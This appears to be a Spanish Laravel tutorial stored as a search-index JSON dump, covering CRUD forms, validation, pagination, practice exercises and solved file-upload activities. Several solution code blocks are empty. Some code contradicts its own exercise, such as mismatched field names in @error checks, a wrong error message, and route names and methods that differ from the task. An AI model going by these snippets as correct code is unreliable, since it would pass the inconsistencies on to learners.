<li>Mediante <code>@method('PUT')</code> indicamos que se haga la petici\u00f3n a la url del formulario mediante el m\u00e9todo PUT, que es como la recogemos en las rutas.</li> <li>Se usa la cl\u00e1usula de seguridad <code>@csrf</code> para evitar ataques desde otros sitios. M\u00e1s info sobre este ataque.</li> <li>El atributo name de los inputs tiene que ser igual al del campo correspondiente de la tabla.</li> <li>Con session('mensaje') mostramos el mensaje que viene del controlador.</li> </ul> <pre><code>&lt;h2&gt;Editando la nota {{ $nota -&gt; id }}&lt;/h2&gt;\n\n&lt;form action=\"{{ route('notas.update', $nota-&gt;id) }}\" method=\"POST\"&gt;\n    @method('PUT') {{-- Necesitamos cambiar al m\u00e9todo PUT para editar --}}\n    @csrf {{-- Cl\u00e1usula para obtener un token de formulario al enviarlo --}}\n\n    @error('nombre')\n        &lt;div class=\"text-red-500 text-lg mt-2\"&gt;El nombre es obligatorio&lt;/div&gt;\n    @enderror\n\n    @error('descripcion')\n        &lt;div class=\"text-red-500 text-lg mt-2\"&gt;La descripci\u00f3n es obligatoria&lt;/div&gt;\n    @enderror\n\n    @error('prioridad')\n        &lt;div class=\"text-red-500 text-lg mt-2\"&gt;La descripci\u00f3n es obligatoria&lt;/div&gt;\n    @enderror\n\n  &lt;input\n      type=\"text\"\n      name=\"titulo\"\n      value=\"{{ $nota-&gt;titulo }}\"\n      placeholder=\"T\u00edtulo de la nota\"\n      autofocus\n  /&gt;\n  &lt;input\n      type=\"text\"\n      name=\"descripcion\"\n      placeholder=\"Descripci\u00f3n de la nota\"\n      value=\"{{ $nota-&gt;descripcion }}\"\n  /&gt;\n  &lt;input\n      type=\"number\"\n      name=\"prioridad\"\n      placeholder=\"5\"\n      value=\"{{ $nota-&gt;prioridad }}\"\n  /&gt;\n\n  &lt;button type=\"submit\"&gt;Guardar cambios&lt;/button&gt;\n&lt;/form&gt;\n\n&lt;div&gt;&lt;a href=\"{{ route('notas.index') }}\"&gt;Volver&lt;/a&gt;&lt;/div&gt;\n</code></pre>"},{"location":"08laravelDatos.html#4-incluir-enlace-para-editar","title":"4. Incluir enlace para editar","text":"<p>En la vista <code>notas/index.blade.php</code> a\u00f1adimos a cada nota que se muestra en la tabla un enlace para poder editarla.</p> <pre><code>&lt;td&gt;&lt;a href=\"{{ route('notas.edit', $nota-&gt;id) }}\"&gt;\ud83d\udcdd&lt;/a&gt;&lt;/td&gt;\n</code></pre>"},{"location":"08laravelDatos.html#eliminar-datos_1","title":"Eliminar datos","text":"<p>Para insertar datos vamos a necesitar 1 ruta y 1 funci\u00f3n en el controlador:</p> <ul> <li>Con la ruta <code>notas/{id}</code> que llega mediante DELETE llamaremos a la funci\u00f3n destroy del controlador.</li> </ul>"},{"location":"08laravelDatos.html#1-ruta","title":"1. Ruta","text":"<p>Creamos las rutas DELETE con su alia correspondiente en nuestro archivo de rutas <code>web.php</code>.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 web.php\nRoute::delete('notas/{id}', [ NotaController::class, 'destroy' ])-&gt;name('notas.destroy');\n</code></pre>"},{"location":"08laravelDatos.html#2-controlador_3","title":"2. Controlador","text":"<p>En el controlador creamos el m\u00e9todo: - <code>destroy</code> que mediante el m\u00e9todo delete() elimina la nota y redirige al listado de notas a\u00f1adiendo un mensaje con with().</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 NotaController.php\n\npublic function destroy($id) {\n    $notaEliminar = Nota::findOrFail($id);\n    $notaEliminar-&gt;delete();\n\n    // Volver al listado de notas\n    return back()-&gt;with('mensaje','Nota eliminada');\n}\n</code></pre>"},{"location":"08laravelDatos.html#3-vista_2","title":"3. Vista","text":"<p>No es necesaria ninguna vista espec\u00edfica \ud83e\udd73</p>"},{"location":"08laravelDatos.html#4-incluir-enlace-para-eliminar","title":"4. Incluir enlace para eliminar","text":"<p>En la vista <code>notas/index.blade.php</code> a\u00f1adimos un bot\u00f3n para cada nota que lance la ruta con el id de la nota a eliminar.</p> <pre><code>&lt;td&gt;\n    &lt;form action=\"{{ route('notas.destroy', $nota-&gt;id) }}\" method=\"POST\"&gt;\n        @method('DELETE')\n        @csrf\n        &lt;button type=\"submit\"&gt;\u274c&lt;/button&gt;\n    &lt;/form&gt;\n&lt;/td&gt;\n</code></pre> <p>Enhorabuena!</p> <p>Si todo ha salido bien, habr\u00e1s creado un sitio en Laravel y Eloquent capaz de hacer un CRUD con datos reales en una base de datos.</p>"},{"location":"08laravelDatos.html#87-validacion","title":"8.7 Validaci\u00f3n","text":"<p>Laravel nos proporciona herramientas para poder validar en el lado del servidor los datos que el usuario introduce en los campos del formulario.</p>"},{"location":"08laravelDatos.html#validacion-basica","title":"Validaci\u00f3n b\u00e1sica","text":"<p>La validaci\u00f3n se hace de los campos recibidos del formulario, por lo que tenemos que utilizar los nombres (atributos name) que utilizamos en los campos del formulario.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 NotaController.php\n\n// Crea una nota con la info del formuluario\npublic function store(Request $request) {\n    // Validar datos recibidos del formulario mediante Request\n    $request -&gt; validate([\n      'titulo' =&gt; 'required|string|min:5',\n      'descripcion' =&gt; 'required|max:255',\n    ]);\n\n    // ... creaci\u00f3n de la nota\n\n    // Volver al formulario para seguir insertando\n    return back()-&gt;with('mensaje', 'Nota insertada');\n}\n</code></pre>"},{"location":"08laravelDatos.html#reglas-comunes","title":"Reglas comunes","text":"<p>El listado completo de reglas se puede consultar en la documentaci\u00f3n oficial, aunque aqu\u00ed se muestran las m\u00e1s comunes: </p> <ul> <li>required: Campo obligatorio.</li> <li>email: Validaci\u00f3n de un correo electr\u00f3nico.</li> <li>min:value: M\u00ednimo de caracteres o valor num\u00e9rico.</li> <li>max:value: M\u00e1ximo de caracteres o valor num\u00e9rico.</li> <li>unique:table,column: Debe ser \u00fanico en una tabla/columna. </li> </ul>"},{"location":"08laravelDatos.html#mensajes-personalizados","title":"Mensajes personalizados","text":"<p>La funci\u00f3n validate() admite 2 arrays:</p> <ol> <li>Listado de elementos con sus reglas de validaci\u00f3n.</li> <li>Listado de mensaje personalizados seg\u00fan el elemento y regla.</li> </ol> <pre><code>&lt;?php\n$request -&gt; validate([\n    'titulo' =&gt; 'required|string|min:5',\n    'descripcion' =&gt; 'required|max:255',\n  ],[\n    'titulo.required' =&gt; 'El campo t\u00edtulo es requerido',\n    'titulo.min' =&gt; 'El campo t\u00edtulo debe tener al menos 5 caracteres',\n    'titulo.string' =&gt; 'El campo t\u00edtulo debe ser de tipo texto',\n  ]);\n</code></pre>"},{"location":"08laravelDatos.html#mostrar-mensajes-error","title":"Mostrar mensajes error","text":"<p>Mediante la directiva @error en la vista del formulario, mostramos los mensajes de error (por defecto o personalizados) asociados a cada campo. Se le pasa el nombre del campo que queremos validar, y si hay un error, se mostrar\u00e1 el mensaje de error utilizando la variable $message. \u00datil para mostrar el mensaje de error junto a su campo correspondiente.</p> <pre><code>&lt;!-- estamos en \u2593\u2593\u2593 notas/create.blade.php (donde est\u00e1 el formulario) --&gt;\n@error('titulo')\n    &lt;p class=\"text-red-500 text-xs mt-2\"&gt; {{ $message }}&lt;/p&gt;\n@enderror\n\n&lt;!-- Tambi\u00e9n es posible escribir directamente el mensaje --&gt;\n@error('descripcion')\n    &lt;p class=\"text-red-500 text-xs mt-2\"&gt;No olvides rellenar la descripci\u00f3n.&lt;/p&gt;\n@enderror\n</code></pre>"},{"location":"08laravelDatos.html#mantener-valor","title":"Mantener valor","text":"<p>En caso de que haya un error podemos mantener el valor que tuviera el campo del formulario mediante el m\u00e9todo old() de Laravel. Recibe el nombre del campo, y si hay un error, mostrar\u00e1 el valor que hab\u00eda introducido el usuario. Admite como segundo par\u00e1metro, el valor inicial del campo.</p> <pre><code>&lt;!-- estamos en \u2593\u2593\u2593 notas.blade.php --&gt;\n&lt;input\n  type=\"text\"\n  name=\"titulo\"\n  value=\"{{ old('titulo') }}\"\n  placeholder=\"T\u00edtulo de la nota\"\n  autofocus\n/&gt;\n\n&lt;!-- En formularios de actualizaci\u00f3n es interesante indicar el valor inicial del campo --&gt;\n&lt;input\n  type=\"text\"\n  name=\"titulo\"\n  value=\"{{ old('titulo', $nota-&gt;titulo) }}\"\n  placeholder=\"T\u00edtulo de la nota\"\n  autofocus\n/&gt;\n</code></pre> <p>Validaci\u00f3n en front y back</p> <p>Debemos siempre validar los datos tanto en el backend (como acabamos de ver) como en el frontend con las opciones que nos da html5 mediante required, pattern o estableciedno el tipo de input apropiado: number, email, date...</p>"},{"location":"08laravelDatos.html#88-paginacion","title":"8.8 Paginaci\u00f3n","text":"<p>Para a\u00f1adir paginaci\u00f3n a nuestros resultados, Eloquent tiene el m\u00e9todo <code>paginate()</code> donde le pasamos un n\u00famero entero como par\u00e1metro para indicarle el n\u00famero de resultados que queremos por p\u00e1gina.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 NotaController.php\n\n// Muestra listado de notas\npublic function index() {\n    $notas = Nota::paginate(3); // 3 notas por p\u00e1gina\n    return view('notas.index', compact('notas'));\n}\n</code></pre> <p>Y en la vista <code>notas/index.blade.php</code>, para que muestre los enlaces para pasar de p\u00e1gina incluimos:</p> <pre><code>&lt;p&gt;{{ $notas-&gt;links() }}&lt;/p&gt;\n</code></pre> <p>La librer\u00eda de paginaci\u00f3n que utiliza Laravel est\u00e1 situada en la carpeta <code>vendor/laravel/framework/src/illuminate/Pagination</code>. Abriendo su archivo <code>resources/views/tailwind.blade.php</code> se puede ver la estructura HTML del sistema de paginaci\u00f3n. </p> <p>Aunqeu no es recomendable tocar la carpeta vendor, por practicar podr\u00edais modificar ese archivo (guardando antes una copia del mismo).</p>"},{"location":"08laravelDatos.html#89-actividades","title":"8.9 Actividades","text":"<p>A continuaci\u00f3n, vas a realizar una serie de ejercicios sencillos sobre cada uno de los apartados vistos en el tema. Puedes crear un proyecto nuevo o reutilizar uno existente.</p>"},{"location":"08laravelDatos.html#migraciones","title":"Migraciones","text":"<p>En este apartado vas a trabajar creando migraciones. Es importante, que aparte del c\u00f3digo en s\u00ed, apuntes los comandos que utilizas para crearlas, eliminarlas, ejecutarlas...</p> <ol> <li>Crear de una tabla b\u00e1sica: Crea una tabla llamada productos con las siguientes columnas:</li> </ol> <ul> <li>id (entero, clave primaria, auto-incremental)</li> <li>nombre (string, longitud m\u00e1xima de 255)</li> <li>precio (decimal, 8 d\u00edgitos en total, 2 decimales)</li> </ul> <ol> <li>A\u00f1adir columnas a una tabla existente: A\u00f1ade una columna descripcion (tipo texto) a la tabla productos.</li> <li>Crear una tabla con claves for\u00e1neas: Crea una tabla categorias y una tabla productos donde cada producto pertenece a una categor\u00eda.</li> <li>Modificar una tabla para a\u00f1adir \u00edndices: A\u00f1ade un \u00edndice \u00fanico a la columna nombre de la tabla categorias.</li> <li>Eliminar una columna de una tabla: Elimina la columna descripcion de la tabla productos.</li> <li>Renombrar una tabla: Cambia el nombre de la tabla productos a articulos.</li> <li>Usar valores predeterminados en una columna: A\u00f1ade una columna stock con un valor por defecto de 0 a la tabla productos.</li> <li>Crear tabla con datos iniciales: Crear tabla usuarios con los siguientes campos:</li> </ol> <ul> <li>id</li> <li>nombre (string)</li> <li>email (string, \u00fanico)</li> <li>password (string)</li> <li>created_at y updated_at</li> </ul> <p>Adem\u00e1s, rell\u00e9nala con datos iniciales mediante el seeder DatabaseSeeder (opcional, se ve en el tema siguiente).</p> <ol> <li> <p>Borrar y recrear la BDD: Utiliza los comandos de Artisan necesarios para eliminar y volver a crear todas las tablas de la BDD.</p> </li> <li> <p>Ejercicio completo: Crear un sistema de reservas: Crea las siguientes tablas para un sistema de reservas:</p> </li> </ol> <ul> <li>usuarios (id, nombre, email, password)</li> <li>habitaciones (id, nombre, capacidad)</li> <li>reservas (id, usuario_id, habitacion_id, fecha_reserva)</li> </ul> <p>Incluye claves for\u00e1neas, valores predeterminados y relaci\u00f3n de \"cascade delete\".</p>"},{"location":"08laravelDatos.html#query-builder","title":"Query Builder","text":"<p>En este apartado vas a trabajar haciendo consultas directamente sobre la BDD mediante Query Builder. </p> <p>Para probar que funciona, se recomienda meter el c\u00f3digo de cada ejercicio en una funci\u00f3n independiente del controlador que se llamar\u00e1 con una ruta que te inventes (por ejemplo: <code>localhost/ejercicio820</code>).</p> <p>Para todos los ejercicios se va a utilizar la tabla productos. Si no la tienes, cr\u00e9ala mediante una migraci\u00f3n con los campos id, nombre, precio, descripcion.</p> <ol> <li>Insertar registros: Inserta un nuevo producto en la tabla. Puedes crear una ruta a la que se le pasen los par\u00e1metros nombre, precio y descripcion.</li> <li>Actualizar registros: Actualiza el nombre de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> <li>Actualizar registros: Actualiza el precio de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> <li>Actualizar registros: Actualiza la descripcion de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> <li>Eliminar registros: Elimina un producto seg\u00fan el id pasado por la ruta.</li> <li>Eliminar registros: Elimina los productos cuyo precio sea inferior a 20.</li> <li>Obtener todos los registros: Obt\u00e9n todos los registros de la tabla productos. </li> <li>Obtener registro por id: Obt\u00e9n un registro por su id pasado por la ruta.</li> <li>Seleccionar columnas espec\u00edficas: Obt\u00e9n solo las columnas nombre y precio de todos los registros de productos.</li> <li>Filtrar registros con where: Obt\u00e9n los productos cuyo precio sea mayor a 50.</li> <li>Ordenar resultados: Ordena los productos por precio de forma descendente.</li> <li>Paginar resultados: Pagina los productos mostrando 5 por p\u00e1gina.</li> <li>Consultas con varios where: Obt\u00e9n productos cuyo precio est\u00e9 entre 50 y 100, y cuya descripci\u00f3n no sea nula.</li> <li>Contar registros: Cuenta cu\u00e1ntos productos tienen un precio mayor a 100.</li> <li>Obtener el registro m\u00e1s caro: Obt\u00e9n el producto con el precio m\u00e1s alto.</li> <li>Ejecutar consultas crudas: Usa una consulta SQL cruda para obtener productos cuyo nombre contenga la palabra \"Premium\".</li> <li>Consulta con uniones (join): Crea la migraci\u00f3n corresponediente para crear la tabla categorias (id, nombre) y hacer que cada producto pertenezca a una categor\u00eda. Una vez hecho, mediante Query Builder obt\u00e9n el nombre del producto junto al nombre de su categor\u00eda.</li> <li>Agrupar resultados con groupBy y having: Agrupa los productos por categor\u00eda y calcula el precio promedio por categor\u00eda, mostrando solo las categor\u00edas con un promedio mayor a 50.</li> <li>Consultas anidadas: Encuentra el producto m\u00e1s caro dentro de cada categor\u00eda.</li> <li>Ejercicio completo: CRUD con Query Builder Implementa un CRUD completo para la tabla clientes utilizando Query Builder:</li> </ol> <ul> <li>C: Inserta nuevos clientes.</li> <li>R: Obt\u00e9n todos los clientes y filtra por email.</li> <li>U: Actualiza el nombre de un cliente espec\u00edfico.</li> <li>D: Elimina clientes con un email espec\u00edfico.</li> </ul>"},{"location":"08laravelDatos.html#eloquent-modelos","title":"Eloquent: Modelos","text":"<p>Antes has trabajado lanzando consultas mediante Query Builder directamente sobre la tabla productos. Ahora har\u00e1s consultas parecidas, pero SIEMPRE desde el modelo mediante Eloquent.</p> <p>Para probar que funciona, se recomienda meter el c\u00f3digo de cada ejercicio en una funci\u00f3n independiente del controlador que se llamar\u00e1 con una ruta que te inventes (por ejemplo: <code>localhost/ejercicio841</code>).</p> <ol> <li>Crear modelo y tabla asociada: Crea el modelo Producto con su tabla asociada productos (ya la tienes del apartado anterior).</li> <li>Inserta productos: Inserta un producto con los campos nombre, precio y descripcion pasados mediante par\u00e1metro por la ruta.</li> <li>Inserta productos: Inserta un producto con los campos nombre, precio y descripcion pasados mediante par\u00e1metro por la ruta, pero validando previamente que su precio sea mayor que 50 para insertarlo realmente.</li> <li>Actualizar productos: Actualiza el nombre de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> <li>Actualizar productos: Actualiza el precio de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> <li>Actualizar productos: Actualiza la descripcion de un producto por su id (ambos de pasan por par\u00e1metro a la ruta).</li> <li>Actualizar m\u00faltiples productos: Actualiza todos los productos cuyo precio sea menor que 50, cambiando su descripcion a 'producto econ\u00f3mico'.</li> <li>Eliminar productos: Elimina un producto seg\u00fan el id pasado por la ruta.</li> <li>Eliminar productos: Elimina los productos cuyo precio sea inferior a 20.</li> <li>Obtener todos los productos: Obt\u00e9n todos los productos de la tabla productos.</li> <li>Obtener producto por id: Obt\u00e9n un producto por su id pasado por la ruta.</li> <li>Filtrar con where: Obt\u00e9n los productos cuyo precio sea mayor a 50.</li> <li>Contar el n\u00famero de productos: Cuenta cu\u00e1ntos productos tienen un precio mayor a 50.</li> <li>Ordenar resultados: Ordena los productos por precio de manera descendente.</li> <li>Usar el m\u00e9todo pluck para obtener solo los nombres de los productos.</li> <li>Usar el m\u00e9todo firstOrCreate para buscar un producto por su nombre, y si no existe, crea un nuevo producto</li> <li>Usar el m\u00e9todo updateOrCreate para actualizar un producto existente por su nombre, o crear uno nuevo si no existe.</li> <li>Limitar resultados: Usa el m\u00e9todo take para obtener solo los 5 primeros productos.</li> <li>Paginaci\u00f3n de resultados: P\u00e1gina los productos mostrando 5 por p\u00e1gina.</li> <li>Consulta con where y orWhere: Recupera todos los productos cuyo precio sea mayor que 100 o cuyo nombre contenga la palabra \"Premium\".</li> <li>Ejercicio completo: CRUD con Eloquent Implementa un CRUD completo mediante Eloquent para el modelo Cliente que crees asociado a la tabla clientes:</li> </ol> <ul> <li>C: Crea nuevos clientes.</li> <li>R: Obt\u00e9n todos los clientes y filtra por email.</li> <li>U: Actualiza el nombre de un cliente espec\u00edfico.</li> <li>D: Elimina clientes con un email espec\u00edfico.</li> </ul>"},{"location":"08laravelDatos.html#formularios","title":"Formularios","text":"<p>En los siguientes ejercicios de formularios vas a realizar un CRUD de productos continuando lo que hiciste en el apartado anterior. Si tienes las clases de Productos (Modelo y Controlador) muy extensas y prefieres empezar de 0, puedes hacer los ejercicios siguientes para gestionar usuarios en vez de productos. Tendr\u00edas que crear previamente el modelo Usuario y tabla asociada usuarios con los campos t\u00edpicos: nombre, email, password.</p> <p>En cualquier caso, recuerda nombrar correctamente las rutas, funciones en controladores y vistas siguiendo las recomendaciones de Laravel.</p> <ol> <li>Formulario para crear productos: Crea un formulario en el que se pidan los campos necesarios para crear un producto. Se acceder\u00e1 mediante <code>GET /productos/create</code> y su vista estar\u00e1 en <code>productos/create.blade.php</code>. El formulario se procesar\u00e1 mediante <code>POST /productos/store</code> redirigiendo finalmente a <code>GET /productos</code> donde se muestra el listado de productos.</li> <li>Formulario para editar productos: Crea el formulario de edici\u00f3n de un producto. Se acceder\u00e1 mediante <code>GET /productos/{id}/edit</code> y su vista estar\u00e1 en <code>productos/edit.blade.php</code>. El formulario se procesar\u00e1 mediante <code>PUT /productos/update</code> redirigiendo finalmente a <code>GET /productos</code> donde se muestra el listado de productos.</li> <li>Validaci\u00f3n de datos: En las funciones correspondientes del controlador donde se reciben los datos de los formularios anteriores, a\u00f1ade validaci\u00f3n a cada uno de los campos:</li> </ol> <ul> <li>nombre: Requerido, tipo cadena y valor m\u00e1ximo 255.</li> <li>precio: Requerido, tipo num\u00e9rico y valor m\u00ednimo 0.</li> <li>descripcion: Tipo cadena y valor m\u00e1ximo 1000.</li> </ul> <p>En las vistas de los 2 formularios a\u00f1ade mensajes de error en el caso de que los campos no pasen la validaci\u00f3n y asigna mediante old el valor antiguo del campo para que el usuario no tenga que volver a escribirlo.</p> <ol> <li>Formulario de confirmaci\u00f3n para eliminar productos: Crear un formulario de confirmaci\u00f3n para eliminar un recurso. S\u00f3lo contendr\u00e1 un mensaje de \"\u00bfEst\u00e1s seguro que quieres eliminar el producto ID?\" y un bot\u00f3n para proceder a eliminarlo. Se acceder\u00e1 mediante <code>GET /productos/{id}/destroy</code> y su vista estar\u00e1 en <code>productos/destroy.blade.php</code>. El formulario se procesar\u00e1 mediante <code>DELETE /productos/{id}</code> redirigiendo finalmente a <code>GET /productos</code> donde se muestra el listado de productos.</li> <li>Ejercicio completo: CRUD con formularios: Contin\u00faa el CRUD del apartado anterior para a\u00f1adir funciones a la gesti\u00f3n de clientes:</li> </ol> <ul> <li>C: Crea nuevos clientes.</li> <li>R: Obt\u00e9n todos los clientes y filtra por diferentes cmapos.</li> <li>U: Actualiza los campos de un cliente espec\u00edfico.</li> <li>D: Elimina clientes.</li> </ul>"},{"location":"08laravelDatos.html#practica-gestion-libros","title":"Pr\u00e1ctica: Gesti\u00f3n libros","text":"<p>Desarrolla una app para gestionar la biblioteca personal de libros del usuario. La aplicaci\u00f3n permitir\u00e1 registrar los libros que ha le\u00eddo o tiene pendientes, junto con informaci\u00f3n relevante como su opini\u00f3n, el formato en el que lo posee, si lo han prestado a alguien...</p> <p>A continuaci\u00f3n se detallan los requisitos. Deber\u00e1s hacer las migraciones correspondientes, rutas, controlador, vistas... que necesites para su implementaci\u00f3n.</p>"},{"location":"08laravelDatos.html#requisitos","title":"Requisitos","text":"<ol> <li>Modelo Libro con los siguientes campos:</li> </ol> <ul> <li>titulo (string): Nombre del libro.</li> <li>autor (string): Nombre del autor.</li> <li>portada (string): URL con la imagen del libro.</li> <li>genero (string): G\u00e9nero: novela, ciencia ficci\u00f3n, ensayo...</li> <li>a\u00f1o_publicacion (integer): A\u00f1o en que se public\u00f3 el libro.</li> <li>formato (string): Formato del libro: f\u00edsico, ebook, pdf...</li> <li>estado_lectura (string): Estado actual del libro: pendiente, leyendo, le\u00eddo, abandonado...</li> <li>puntuacion (integer, 1-10): Puntuaci\u00f3n personal sobre el libro.</li> <li>favorito (boolean): Indica si est\u00e1 en la lista de favoritos del usuario.</li> <li>opinion (string, nullable): Opini\u00f3n personal del libro.</li> <li>prestado_a (string, nullable): Nombre de la persona a la que ha prestado el libro (si aplica).</li> <li>fecha_prestamo (date, nullable): Fecha en la que lo prest\u00f3 (si aplica).</li> </ul> <ol> <li>Funciones CRUD:</li> </ol> <ul> <li>Agregar nuevos libros a la biblioteca.</li> <li>Editar la informaci\u00f3n de un libro.</li> <li>Eliminar libros.</li> <li>Listar todos los libros con opciones de filtrado.</li> </ul> <ol> <li>Vistas con Blade:</li> </ol> <ul> <li>Listado de libros con opciones de borrado, b\u00fasqueda y filtros (por estado de lectura, g\u00e9nero, formato, puntuaci\u00f3n, favoritos, prestados...).</li> <li>Formulario para a\u00f1adir y editar libros.</li> <li>P\u00e1gina de detalle de cada libro con su informaci\u00f3n completa.</li> </ul> <ol> <li>Extras opcionales:</li> </ol> <ul> <li>Mostrar una alerta si un libro lleva prestado m\u00e1s de 30 d\u00edas.</li> <li>Opci\u00f3n de paginar el listado de libros.</li> <li>Exportar datos a fichero CSV descargable.</li> <li>Gr\u00e1fico simple con estad\u00edsticas de libros le\u00eddos vs pendientes.</li> <li>Gr\u00e1fico de barras de libros le\u00eddos por a\u00f1o.</li> </ul>"},{"location":"08laravelDatos.html#practica-diario-personal","title":"Pr\u00e1ctica: Diario personal","text":"<p>Desarrolla una app para llevar un diario personal digital. En esta aplicaci\u00f3n, el usuario podr\u00e1 realizar anotaciones en cualquier momento, organizarlas por categor\u00edas y visualizar un listado con opciones de filtrado. Una anotaci\u00f3n puede ser cualquier cosa que se le pase por la cabeza, una idea, reflexi\u00f3n...</p> <p>A continuaci\u00f3n se detallan los requisitos. Deber\u00e1s hacer las migraciones correspondientes, rutas, controlador, vistas... que necesites para su implementaci\u00f3n.</p>"},{"location":"08laravelDatos.html#requisitos_1","title":"Requisitos","text":"<ol> <li>Modelo Anotacion con los siguientes campos:</li> </ol> <ul> <li>titulo (string): T\u00edtulo de la anotaci\u00f3n.</li> <li>contenido (text): Cuerpo de la anotaci\u00f3n.</li> <li>categoria (enum: \"Personal\", \"Trabajo\", \"Ideas\", \"Otros\"): Categor\u00eda de la anotaci\u00f3n. INVESTIGA sobre c\u00f3mo utilizar un tipo enumerado</li> <li>fecha (date): Fecha en la que se cre\u00f3 la anotaci\u00f3n.</li> <li>favorito (boolean): Indica si es una anotaci\u00f3n destacada.</li> </ul> <ol> <li>Funciones CRUD:</li> </ol> <ul> <li>Crear nuevas anotaciones.</li> <li>Editar y actualizar anotaciones existentes.</li> <li>Eliminar anotaciones.</li> <li>Listar todas las anotaciones con opciones de filtrado.</li> </ul> <ol> <li>Vistas con Blade:</li> </ol> <ul> <li>Listado de anotaciones, con b\u00fasqueda y filtros por categor\u00eda, fecha o si est\u00e1 marcada como favorita.</li> <li>Formulario para a\u00f1adir anotaciones con fecha por defecto, la de hoy.</li> <li>Formulario para editar anotaciones.</li> <li>Vista de detalle de una anotaci\u00f3n.</li> </ul> <ol> <li>Extras opcionales:</li> </ol> <ul> <li>Posibilidad de marcar una anotaci\u00f3n como \"favorita\" y que se muestre destacada.</li> <li>Ordenar las anotaciones por fecha (m\u00e1s recientes primero).</li> <li>Implementar un calendario donde el usuario pueda ver qu\u00e9 d\u00edas tiene anotaciones.</li> </ul>"},{"location":"09actividadesResueltas.html","title":"Laravel Avanzado: Actividades resueltas","text":"<p>A continuaci\u00f3n, vas a realizar una serie de ejercicios sobre cada uno de los apartados vistos en el tema. Puedes crear un proyecto nuevo o reutilizar uno existente.</p>"},{"location":"09actividadesResueltas.html#manejo-de-ficheros","title":"Manejo de ficheros","text":"<p>Para practicar con los ficheros vas a crear una galer\u00eda de im\u00e1genes con posibilidad de subir nuevas, eliminar y acceder a su vista en detalle. Tambi\u00e9n vas a implementar un \"Mini Drive\" para gestionar archivos. En ambos casos, vas a trabajar sin modelos para centrarte exclusivamente en el manejo de ficheros, pero en una app real, adem\u00e1s ser\u00eda recomendable trabajar con una BDD que almacene la informaci\u00f3n necesaria de los archivos.</p> <ol> <li>Formulario de subida: Crea un formulario para subir una imagen. La ruta que lleva al formulario por GET ser\u00e1 <code>imagen/create</code> y la vista del mismo ser\u00e1 <code>imagen/create.blade.php</code>. El formulario se enviar\u00e1 por POST a la ruta <code>imagen/storage</code>. Adem\u00e1s del propio input de la imagen, el formulario tendr\u00e1 un radio button para seleccionar si la imagen se almacenar\u00e1 de forma privada o p\u00fablica en el storage.</li> </ol> Soluci\u00f3n <p>La ruta para abrir el formulario:</p> <pre><code>&lt;?php\n</code></pre> <p>La vista <code>imagen/create.blade.php</code> con el formulario de subida:</p> <pre><code>    &lt;form action=\"{{ route('subir.imagen') }}\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    @csrf\n    &lt;input type=\"file\" name=\"imagen\" required&gt;\n    &lt;button type=\"submit\"&gt;Subir Imagen&lt;/button&gt;\n&lt;/form&gt;\n</code></pre> <ol> <li>Almacenar archivos: Crea la funci\u00f3n correspondiente en el controlador para recibir la imagen del formulario anterior validando que sea del tipo imagen, requerida y con un tama\u00f1o m\u00e1ximo de 2MB. Y seg\u00fan la opci\u00f3n del formulario, almacena la imagen de forma privada o p\u00fablica en el storage. Despu\u00e9s redirecciona a la p\u00e1gina anterior enviando un mensaje del tipo \"Imagen NOMBRE almacenada correctamente en el storage privado|p\u00fablico\" que mostrar\u00e1s justo encima del formulario.</li> </ol> Soluci\u00f3n <p>La funci\u00f3n 'store' del controlador almacena la imagen en el directorio <code>storage/app/public/imagenes</code>:</p> <pre><code>&lt;?php\nuse Illuminate\\Http\\Request;\n\nclass ArchivoController extends Controller\n{\n    public function subirImagen(Request $request)\n    {\n        $request-&gt;validate([\n            'imagen' =&gt; 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n        ]);\n\n        if ($request-&gt;file('imagen')) {\n            $path = $request-&gt;file('imagen')-&gt;store('imagenes', 'public');\n            return back()-&gt;with('success', 'Imagen subida correctamente.')-&gt;with('path', $path);\n        }\n\n        return back()-&gt;withErrors('Error al subir la imagen.');\n    }\n}\n</code></pre> <p>Aseg\u00farate de crear el enlace simb\u00f3lico desde 'public' para que las im\u00e1genes sean accesibles p\u00fablicamente. Ve a la ra\u00edz del proyecto y ejectua (s\u00f3lo se hace una vez):</p> <pre><code>php artisan storage:link\n</code></pre> <ol> <li>Mostrar archivos: Mediante la ruta por GET <code>imagen</code> que lleva a la vista <code>imagen/index.blade.php</code> muestra una galer\u00eda con todas las im\u00e1genes en miniatura. Puedes utilizar flexbox o grid layout para posicionarlas unas al lado de las otras. Importante: No olvides crear el enlace simb\u00f3lico para poder acceder a las im\u00e1genes. Crea un enlace \"Subir imagen\" que lleve al formulario del primer punto y en dicho formulario, un enlace para volver aqu\u00ed, al listado.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n</code></pre> <ol> <li>Mostrar imagen completa: Mediante la ruta por GET <code>imagen/{name}</code> que lleva a la vista <code>imagen/show.blade.php</code> muestra la vista en tama\u00f1o completo de la imagen. Muestra un p\u00e1rrafo con su ruta completa y un enlace para volver al listado.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\n</code></pre> <ol> <li>Eliminar archivos: Mediante la ruta por GET <code>imagen/{name}/destroy</code> elimina la imagen que corresponda. A esta ruta podr\u00e1s llegar mediante un enlace de la vista en detalle de la imagen. Una vez eliminada, se redirige autom\u00e1ticamente al listado enviando con 'with' un mensaje del tipo \"Imagen NOMBRE eliminada correctamente del storage p\u00fablico\".</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\nuse Illuminate\\Support\\Facades\\Storage;\n\npublic function eliminarImagen($filename)\n{\n    $path = 'imagenes/' . $filename;\n\n    if (Storage::disk('public')-&gt;exists($path)) {\n        Storage::disk('public')-&gt;delete($path);\n        return back()-&gt;with('success', 'Imagen eliminada correctamente.');\n    }\n\n    return back()-&gt;withErrors('El archivo no existe.');\n}\n</code></pre> <p>Con la ruta:</p> <pre><code>&lt;?php\nRoute::delete('/eliminar-imagen/{filename}', [ArchivoController::class, 'eliminarImagen']);\n</code></pre> <ol> <li>Almacenamiento en S3 (opcional): Con tu cuenta de estudiante de AWS, 